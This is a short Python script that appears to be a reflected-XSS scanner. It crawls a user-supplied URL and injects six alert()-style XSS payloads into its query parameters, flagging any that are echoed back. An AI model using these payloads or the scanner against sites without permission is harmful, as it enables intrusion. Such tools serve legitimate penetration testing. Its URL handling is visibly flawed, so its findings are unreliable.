import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urljoin

# Payloads for testing XSS
def generate_payloads():
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "'><svg/onload=alert('XSS')>",
        "\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "onmouseover=alert('XSS')",
    ]

# Extract parameters from a URL
def extract_parameters(url):
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    return params

# Crawl the website to find forms and URLs
def crawl(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        links = soup.find_all('a', href=True)

        print(f"[+] Found {len(forms)} forms and {len(links)} links on {url}")

        # Extract form actions and parameters
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            form_params = {input.get('name'): input.get('value', '') for input in inputs}
            print(f"[+] Form found: {action} (Method: {method}, Params: {form_params})")

        # Extract links
        for link in links:
            href = link['href']
            full_url = urljoin(url, href)
            print(f"[+] Link found: {full_url}")

    except Exception as e:
        print(f"[-] Error crawling {url}: {e}")

# Test for XSS vulnerabilities
def test_xss(url, params):
    payloads = generate_payloads()
    vulnerable = False

    for param in params:
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            response = requests.get(test_url)
            if payload in response.text:
                print(f"[+] Vulnerable parameter: {param} with payload: {payload}")
                vulnerable = True

    if not vulnerable:
        print("[-] No XSS vulnerabilities found.")

# Main function
def main():
    # Prompt the user for the target URL
    target_url = input("Enter the target URL: ").strip()

    if not target_url:
        print("[-] Please provide a valid URL.")
        return

    print(f"[*] Starting XSS detection on {target_url}")
    crawl(target_url)
    params = extract_parameters(target_url)

    if params:
        print(f"[*] Testing parameters: {params}")
        test_xss(target_url, params)
    else:
        print("[-] No parameters found in the URL.")

if __name__ == "__main__":
    main()
